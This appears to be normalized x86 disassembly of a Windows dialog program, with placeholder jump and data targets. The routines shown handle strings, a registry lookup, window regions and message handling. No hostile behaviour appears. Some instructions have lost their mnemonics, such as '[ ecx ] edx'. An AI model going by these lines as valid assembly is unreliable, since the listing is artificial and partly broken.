pop ecx
retn
cmp [ esi + 0x38 ] 0xffff
je r-xdata
mov ecx [ esi + 0x2c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x14 ]
sub eax [ esi + 0xc ]
mov edi rw-data
imul eax [ esi + 0x28 ]
cdq
idiv ecx
mov ebx eax
call sub_4230c0
mov eax [ rw-data ]
add eax ebx
cmp [ esi + 0x38 ] eax
jl r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov [ esi + 0x38 ] 0x0
add [ esi + 0x38 ] 0x2
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x0
push 0x0
push esi
call eax
sub_41d610
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov esi eax
cmp edi ebp
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx ebx
sar ecx 0x1
push ecx
call sub_429cc0
add edi 0x1c
add esi 0x1c
cmp edi ebp
jne r-xdata
mov ecx eax
lea ebx [ ecx + 0x2 ]
cmp [ edi + 0x18 ] 0x8
jb r-xdata
mov eax esi
pop ebx
sub_41d660
sub esp 0x8
push esi
mov esi eax
xor al al
mov [ esp + 0x8 ] al
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
mov [ esp + 0x4 ] al
mov eax [ esp + 0x4 ]
push eax
push ecx
push edx
push esi
mov eax edi
mov ecx ebx
call sub_41d610
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
lea ecx [ eax * 8 ]
add esp 0x10
sub ecx eax
lea eax [ edi + ecx * 4 ]
pop esi
add esp 0x8
retn
sub_41d6c0
push ebx
push ebp
mov ebp [ esp + 0xc ]
push edi
mov [ ebp ] 0x0
test esi esi
je r-xdata
call sub_4407b7
mov eax [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
cmp [ esi + 0xc ] eax
ja r-xdata
call sub_4407b7
mov ebx [ esp + 0x20 ]
cmp ebx [ esi + 0x10 ]
jbe r-xdata
cmp eax [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
cmp eax ecx
je r-xdata
mov eax [ ebp ]
mov ecx [ esi ]
test eax eax
je r-xdata
mov ebx [ esp + 0x20 ]
mov ecx [ esi ]
mov [ ebp ] ecx
mov [ ebp + 0x4 ] eax
cmp [ esi + 0xc ] ebx
ja r-xdata
pop edi
mov eax ebp
pop ebp
pop ebx
retn 0x14
mov eax [ esi + 0x10 ]
call sub_41d660
mov edx [ esp + 0x10 ]
mov edi [ esi + 0x10 ]
push edx
mov ebx eax
call sub_429630
add esp 0x4
mov [ esi + 0x10 ] ebx
mov edi [ ebp + 0x4 ]
cmp edi ebx
je r-xdata
sub_41d750
sub esp 0x10
push ebx
push ebp
push esi
mov esi eax
mov ebx [ esi + 0x64 ]
add esi 0x54
cmp [ esi + 0xc ] ebx
jbe r-xdata
mov ebp [ esi + 0xc ]
mov eax [ esi ]
mov [ esp + 0x10 ] eax
cmp ebp [ esi + 0x10 ]
jbe r-xdata
call sub_4407b7
mov ecx [ esp + 0x10 ]
mov eax [ esi ]
push ebx
push ecx
push ebp
push eax
lea edx [ esp + 0x20 ]
push edx
call sub_41d6c0
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
xor ebp ebp
add eax edx
je r-xdata
call sub_4407b7
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov [ esp + 0x10 ] ebp
cmp ebp eax
jb r-xdata
mov eax [ edi + 0xc ]
add eax [ esp + 0x10 ]
mov ebx esi
push eax
call sub_428670
mov ecx [ edi + 0x10 ]
sub ecx [ edi + 0xc ]
add [ esp + 0x10 ] 0x1c
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc ebp
add eax edx
cmp ebp eax
jb r-xdata
call sub_4407b7
sub_41d800
push 0xffffffff
push sub_45a660
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
push 0x2a
mov eax r--data
mov esi edi
call sub_429cc0
push 0x1a
mov eax r--data
mov ecx edi
call sub_429170
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x10 ] eax
lea esi [ esp + 0x10 ]
mov [ esp + 0x20 ] 0x0
call sub_41d9b0
lea eax [ esp + 0xc ]
push r--data
push eax
mov ecx esi
call sub_41daf0
add esp 0x8
mov [ esp + 0x20 ] 0x1
mov eax [ eax ]
mov ecx eax
lea esi [ ecx + 0x2 ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
mov ecx edi
call sub_429170
mov [ esp + 0x20 ] 0x0
mov eax [ esp + 0xc ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x24 ] 0x2
call sub_41efa0
add esp 0x4
lea edx [ esp + 0x14 ]
push r--data
push edx
lea ecx [ esp + 0x14 ]
call sub_41daf0
add esp 0x8
mov [ esp + 0x20 ] 0x3
mov eax [ eax ]
mov ecx eax
lea esi [ ecx + 0x2 ]
mov edi edi
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
mov ecx edi
call sub_429170
mov [ esp + 0x20 ] 0x2
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ esp + 0x20 ] 0x0
mov eax [ esp + 0xc ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esp + 0x20 ] 0xffffffff
mov eax [ esp + 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x1c
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_41d9b0
sub esp 0x8
cmp [ rw-data ] 0x0
push ebx
je r-xdata
lea eax [ esp + 0x4 ]
push eax
push rw-data
lea ecx [ esp + 0x10 ]
push ecx
push r--data
push r--data
push 0x80000002
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x1c ] 0x8
call [ SHGetValueW@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax rw-data
lea edx [ eax + 0x2 ]
mov eax rw-data
lea edx [ eax + 0x2 ]
lea esp [ esp ]
push r--data
push rw-data
call [ StrCpyW@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
mov ebx eax
push rw-data
mov eax esi
call sub_41fc00
pop ebx
add esp 0x8
retn
sub_41da60
push ebp
mov ebp [ esp + 0x8 ]
push esi
mov esi eax
mov eax [ esp + 0x18 ]
push edi
lea edi [ esi + eax ]
mov eax [ ebp ]
mov edx [ eax - 0x8 ]
sub eax 0x10
mov ecx 0x1
sub ecx [ eax + 0xc ]
sub edx edi
or ecx edx
jge r-xdata
mov eax [ esp + 0x14 ]
push ebx
mov ebx [ ebp ]
add esi esi
push esi
push eax
push esi
push ebx
call sub_43f985
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
add eax eax
push eax
push ecx
push eax
add esi ebx
push esi
call sub_43f985
add esp 0x20
pop ebx
test edi edi
jl r-xdata
mov ecx edi
mov eax ebp
call sub_41fb90
push 0x80070057
call sub_427e00
mov eax [ ebp ]
cmp edi [ eax - 0x8 ]
jg r-xdata
mov [ eax - 0xc ] edi
mov edx [ ebp ]
xor eax eax
mov [ edx + edi * 2 ] ax
pop edi
pop esi
pop ebp
retn
sub_41daf0
push 0xffffffff
push sub_459919
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push ebp
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x28 ]
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
mov eax [ esi ]
mov ecx [ eax - 0x10 ]
test ecx ecx
je r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0x10 ]
mov ecx rw-data
call eax
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
call eax
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
add eax 0x10
mov [ ebx ] eax
mov [ esp + 0x20 ] 0x0
mov edx [ esi ]
mov esi [ edx - 0xc ]
mov [ esp + 0x10 ] 0x1
test ebp ebp
jne r-xdata
push 0x80004005
call sub_427e00
xor ecx ecx
test eax eax
setne cl
test ecx ecx
jne r-xdata
mov eax ebp
lea ecx [ eax + 0x2 ]
mov [ esp + 0x14 ] ecx
lea ecx [ ecx ]
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ esp + 0x14 ]
sar eax 0x1
push esi
push edx
push ebp
push ebx
call sub_41da60
add esp 0x10
mov eax ebx
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
add esp 0x14
retn
sub_41dbe0
push 0xffffffff
push sub_45a660
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x18 ]
mov [ fs : 0x0 ] eax
push 0x2a
mov eax r--data
mov esi edi
call sub_429cc0
push 0x19
mov eax r--data
mov ecx edi
call sub_429170
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ esp + 0x10 ] eax
lea esi [ esp + 0x10 ]
mov [ esp + 0x20 ] 0x0
call sub_41d9b0
lea eax [ esp + 0xc ]
push r--data
push eax
mov ecx esi
call sub_41daf0
add esp 0x8
mov [ esp + 0x20 ] 0x1
mov eax [ eax ]
mov ecx eax
lea esi [ ecx + 0x2 ]
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
mov ecx edi
call sub_429170
mov [ esp + 0x20 ] 0x0
mov eax [ esp + 0xc ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
add eax 0x10
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x24 ] 0x2
call sub_41efa0
add esp 0x4
lea edx [ esp + 0x14 ]
push r--data
push edx
lea ecx [ esp + 0x14 ]
call sub_41daf0
add esp 0x8
mov [ esp + 0x20 ] 0x3
mov eax [ eax ]
mov ecx eax
lea esi [ ecx + 0x2 ]
mov edi edi
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx esi
sar ecx 0x1
push ecx
mov ecx edi
call sub_429170
mov [ esp + 0x20 ] 0x2
mov eax [ esp + 0x14 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ esp + 0x20 ] 0x0
mov eax [ esp + 0xc ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov [ esp + 0x20 ] 0xffffffff
mov eax [ esp + 0x10 ]
add eax 0xfffffff0
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x1c
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_41dd90
push ecx
push ebx
push edi
mov ebx r--data
lea edi [ esi + 0x2a8 ]
mov [ esi + 0x27c ] ebx
call sub_422960
mov eax [ esi + 0x2a4 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
lea edi [ esi + 0x254 ]
mov [ esi + 0x228 ] ebx
call sub_422960
mov eax [ esi + 0x250 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x200 ]
mov [ esi + 0x1d4 ] ebx
call sub_422960
mov eax [ esi + 0x1fc ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
lea edi [ esi + 0x1ac ]
mov [ esi + 0x180 ] ebx
call sub_422960
mov eax [ esi + 0x1a8 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
push esi
call sub_41e010
pop edi
pop ebx
pop ecx
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_41de90
push 0xffffffff
push sub_45b3f8
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
xor edi edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
lea eax [ esi + 0x30 ]
push eax
mov [ esp + 0x18 ] edi
call sub_4235c0
mov [ esi + 0x2c ] r--data
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov eax 0x1
mov [ esi + 0x78 ] eax
mov [ esi + 0x7c ] eax
mov [ esi + 0x80 ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov eax [ esi + 0x84 ]
cmp eax edi
je r-xdata
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi ] r--data
mov [ esi + 0x2c ] r--data
mov [ esi + 0x9c ] edi
mov [ esi + 0xa0 ] edi
xor eax eax
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa8 ] eax
mov [ esi + 0xac ] eax
mov [ esi + 0xb0 ] eax
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0x98 ] r--data
mov [ esi + 0xcc ] edi
mov [ esi + 0xc4 ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xd4 ] edi
mov [ esi + 0xd8 ] 0x80000000
mov [ esi + 0xdc ] edi
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn 0x4
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x84 ] edi
sub_41dfd0
push esi
mov esi eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x28 ] 0x0
mov esi [ esi + 0x14 ]
test esi esi
je r-xdata
push eax
call [ GlobalFree@IAT ]
pop esi
retn
push esi
call sub_43f531
sub_41e010
push 0xffffffff
push sub_45b3f8
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x1c ]
xor edi edi
mov [ esp + 0x14 ] edi
mov eax [ esi + 0x84 ]
cmp eax edi
je r-xdata
lea eax [ esi + 0x30 ]
push eax
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
call sub_423700
mov [ esp + 0x14 ] 0xffffffff
mov eax [ esi + 0x20 ]
cmp eax edi
je r-xdata
push eax
call sub_44120e
add esp 0x4
mov [ esi + 0x84 ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov esi [ esi + 0x14 ]
cmp esi edi
je r-xdata
push eax
call [ GlobalFree@IAT ]
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn 0x4
push esi
call sub_43f531
sub_41e0b0
push 0xffffffff
push sub_4595a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x38 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x4c ]
movzx ebp ax
push 0x7
shr eax 0x10
push 0x7
mov esi eax
lea eax [ esi + 0x1 ]
push eax
lea ecx [ ebp + 0x1 ]
push ecx
xor edi edi
push edi
push edi
call [ CreateRoundRectRgn@IAT ]
mov ebx eax
mov [ esp + 0x4c ] ebx
mov [ esp + 0x40 ] edi
mov ecx 0x1
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] ecx
lea eax [ ebp - 0x2 ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] ecx
lea ecx [ esi - 0x2 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] ecx
mov edi edi
inc edi
cmp edi 0x4
jl r-xdata
push esi
call [ DeleteObject@IAT ]
mov eax [ esp + edi * 8 + 0x1c ]
mov ecx [ esp + edi * 8 + 0x18 ]
lea edx [ eax + 0x1 ]
push edx
lea edx [ ecx + 0x1 ]
push edx
push eax
push ecx
call [ CreateRectRgn@IAT ]
push 0x4
mov esi eax
push esi
push ebx
push ebx
call [ CombineRgn@IAT ]
test esi esi
je r-xdata
mov esi [ esp + 0x48 ]
mov eax [ esi + 0x4 ]
push 0x1
push ebx
push eax
call [ SetWindowRgn@IAT ]
mov edi [ esi + 0xd4 ]
call sub_4230c0
sub ebp [ edi + 0xc ]
mov ecx [ esi + 0xb4 ]
mov edx [ ecx ]
mov eax [ edx + 0x24 ]
add esi 0x98
push 0x1
sub ebp 0x3
push ebp
push esi
call eax
mov eax [ esp + 0x48 ]
mov ecx [ eax + 0x19c ]
mov edx [ ecx ]
add eax 0x180
push 0x9
push 0x21
push eax
mov eax [ edx + 0x24 ]
call eax
mov eax [ esi + 0x4 ]
test al 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov ecx [ esi + 0x1c ]
or eax 0x1
mov [ esi + 0x4 ] eax
test ecx ecx
je r-xdata
mov eax 0x1
mov ecx [ esp + 0x38 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn 0x8
push ebx
call [ DeleteObject@IAT ]
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push 0x0
push 0x1
push 0x0
push esi
call eax
sub_41e210
push ebx
push esi
push edi
movzx edi ax
shr eax 0x10
mov esi ecx
mov edx [ esi ]
push eax
mov eax [ edx + 0x10 ]
push edi
call eax
mov ecx [ esi + 0x4 ]
push 0xfffffff0
push ecx
call [ GetWindowLongW@IAT ]
mov ebx [ esi + 0xa4 ]
mov ecx [ esi + 0xb4 ]
and eax 0x1000000
neg eax
sbb eax eax
lea edx [ esi + 0x98 ]
mov esi [ ecx ]
and eax 0xfffffffd
add eax 0x5
sub ebx eax
sub ebx [ edx + 0x14 ]
push 0x1
add ebx edi
push ebx
push edx
mov edx [ esi + 0x24 ]
call edx
mov eax [ esp + 0x10 ]
pop edi
pop esi
mov [ eax ] 0x0
mov eax 0x1
pop ebx
retn 0x4
sub_41e280
push ecx
push ebx
push ebp
push esi
push edi
xor ebp ebp
mov edi ecx
mov [ eax ] ebp
cmp edi ebp
je r-xdata
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
cmp ecx ebp
je r-xdata
call sub_4230c0
mov ebx [ edi + 0x10 ]
mov edi [ esi + 0x34 ]
call sub_4230c0
mov ecx [ esi + 0x1c ]
mov eax [ edi + 0xc ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push ebx
push eax
push esi
call edx
lea esi [ edi + 0x98 ]
mov ebx 0x2
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov edx [ ecx ]
mov eax [ edx ]
push esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x14 ]
push ebp
push ebp
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x18 ]
push ebp
push ebp
mov ecx esi
call eax
mov edi [ edi + 0xd4 ]
mov [ esi + 0x34 ] edi
test [ esi + 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push ebp
push ebp
push ebp
push esi
call edx
sub_41e330
push ecx
cmp [ esp + 0x1c ] 0x0
push ebx
push ebp
push esi
push edi
mov esi ecx
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x18
mov edi [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
mov ebp [ esp + 0x24 ]
mov edx [ esp + 0x1c ]
push edi
push eax
mov eax [ esp + 0x20 ]
lea ebx [ esi + 0x2c ]
push ebx
mov ecx ebp
call sub_4279f0
test eax eax
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x18
mov eax [ esp + 0x1c ]
cmp eax 0x201
jne r-xdata
cmp eax 0x5
jne r-xdata
mov ecx [ esi + 0x4 ]
push 0x0
push 0xf012
push 0x112
push ecx
mov [ esp + 0x2c ] 0x1
call [ SendMessageW@IAT ]
lea edx [ esp + 0x1c ]
push edx
mov eax ebp
call sub_427320
cmp eax 0x110
jne r-xdata
mov ebx 0x1
mov [ esp + 0x1c ] ebx
cmp [ esp + 0x20 ] ebx
je r-xdata
cmp eax 0x111
jne r-xdata
lea eax [ esp + 0x1c ]
mov ecx esi
mov [ esp + 0x1c ] 0x1
call sub_41e280
jmp r-xdata
xor ecx ecx
mov eax ebx
lea eax [ esp + 0x1c ]
push eax
mov eax ebp
mov ecx esi
call sub_41e210
mov ecx [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx eax
shr ecx 0x10
xor edx edx
cmp dx cx
jne r-xdata
cmp [ esp + 0x1c ] 0x0
mov [ edi ] eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x18
mov [ edi ] eax
test ecx ecx
je r-xdata
lea ecx [ eax - 0x1 ]
cmp cx 0xa
ja r-xdata
movzx edx ax
mov eax [ esi + 0x4 ]
push edx
push eax
call [ EndDialog@IAT ]
mov [ edi ] 0x0
mov eax 0x1
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x18
sub_41e460
sub esp 0x1c
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
xor ebp ebp
cmp edi ebp
je r-xdata
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
lea esi [ edi + 0x180 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
push r--data
push esi
call sub_41ff60
cmp edi ebp
je r-xdata
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
lea ebx [ edi + 0xe0 ]
mov [ ebx + 0x1c ] ecx
mov [ ebx + 0x20 ] ebp
mov [ ebx + 0x24 ] ebp
mov [ ebx + 0x4 ] 0x3
mov [ ebx + 0x8 ] 0x4c9
mov [ ebx + 0xc ] ebp
mov [ ebx + 0x10 ] ebp
mov [ ebx + 0x14 ] ebp
mov [ ebx + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push ebx
call edx
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
mov ecx ebx
call edx
mov eax [ ebx ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx ebx
call edx
mov eax [ ebx ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx ebx
call edx
cmp edi ebp
je r-xdata
mov ecx [ esi + 0x1c ]
cmp ecx ebp
je r-xdata
mov edi rw-data
call sub_4230c0
mov eax [ rw-data ]
mov edi [ esi + 0x34 ]
mov [ esp + 0x14 ] eax
call sub_4230c0
mov eax [ esp + 0x14 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push eax
mov eax [ edi + 0xc ]
push eax
push esi
call edx
mov edi [ esp + 0x30 ]
lea esi [ edi + 0x118 ]
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] 0x4ca
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ebp
push ebp
mov ecx esi
call edx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
push ebp
push ebp
mov ecx esi
call edx
test [ esi + 0x4 ] 0x2
mov [ esi + 0x34 ] rw-data
je r-xdata
test [ ebx + 0x4 ] 0x2
mov [ ebx + 0x34 ] rw-data
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push ebp
push ebp
push ebp
push esi
call edx
mov ecx [ ebx + 0x1c ]
cmp ecx ebp
je r-xdata
mov edi rw-data
call sub_4230c0
mov eax [ rw-data ]
mov edi [ ebx + 0x34 ]
mov [ esp + 0x14 ] eax
call sub_4230c0
mov eax [ esp + 0x14 ]
mov ecx [ ebx + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
push eax
mov eax [ edi + 0xc ]
push eax
push ebx
call edx
mov edi [ esp + 0x30 ]
mov ecx [ ebx + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x97
push 0xc4
push ebx
call edx
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x24 ]
push 0x97
push 0x106
push esi
call edx
cmp edi ebp
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push ebp
push ebp
push ebp
push ebx
call edx
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
xor ecx ecx
lea ecx [ edi + 0x2c ]
jmp r-xdata
lea esi [ edi + 0x150 ]
mov ebx 0x3
mov [ esi + 0x1c ] ecx
mov [ esi + 0x20 ] ebp
mov [ esi + 0x24 ] ebp
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebp
mov [ esi + 0x10 ] ebp
mov [ esi + 0x14 ] ebp
mov [ esi + 0x18 ] ebp
mov eax [ ecx ]
mov edx [ eax ]
push esi
call edx
mov eax [ esi ]
